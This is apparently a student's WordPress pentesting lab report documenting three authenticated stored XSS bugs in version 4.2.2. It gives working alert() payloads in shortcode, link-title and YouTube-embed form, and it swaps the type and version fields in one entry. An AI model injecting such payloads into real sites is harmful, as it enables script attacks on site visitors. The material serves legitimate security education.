# Project 7 - WordPress Pentesting

Time spent: **2** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Authenticated Shortcode Tags Cross-Site Scripting (XSS)
  - [x] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2.2
    - Fixed in version: 4.2.5
  - [x] GIF Walkthrough:
		<img src='http://i.imgur.com/9WTEPm1.gif' title='Video Walkthrough' width='' alt='Video Walkthrough' />
  - [x] Steps to recreate: 
    - Edit Post
    - Add the following code: 

		TEST!!![caption width="1" caption='<a href="'">]</a><a href="http://onMouseOver='alert(1)'">Click me</a>

    - Put mouse over "Click me"
  - [x] Affected source code:
    - [Link1](https://github.com/WordPress/WordPress/commit/f72b21af23da6b6d54208e5c1d65ececdaa109c8)
1. (Required) Authenticated Stored Cross-Site Scripting (XSS)
  - [x] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2.2
    - Fixed in version: 4.2.3
  - [x] GIF Walkthrough: 
		<img src='http://i.imgur.com/iFSj2Ow.gif' title='Video Walkthrough' width='' alt='Video Walkthrough' />
  - [x] Steps to recreate: 
    - Edit Post
    - Add the following code: 

		<a href="[caption code=">]</a><a title="onmouseover=alert('test')  ">link</a>

    - Put mouse over "link"
  - [x] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/changeset/33359)
1. (Required) Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
  - [x] Summary: 
    - Vulnerability types: 4.2.2
    - Tested in version: XSS
    - Fixed in version:	4.2.13 
  - [x] GIF Walkthrough: 
		<img src='http://i.imgur.com/6zsJXyI.gif' title='Video Walkthrough' width='' alt='Video Walkthrough' />
  - [x] Steps to recreate: 
    - Edit Post
    - Add the following code: 

		https://youtube[.]com/watch?v=abc<svg onload=alert(5)>

    - Refresh page
  - [x] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
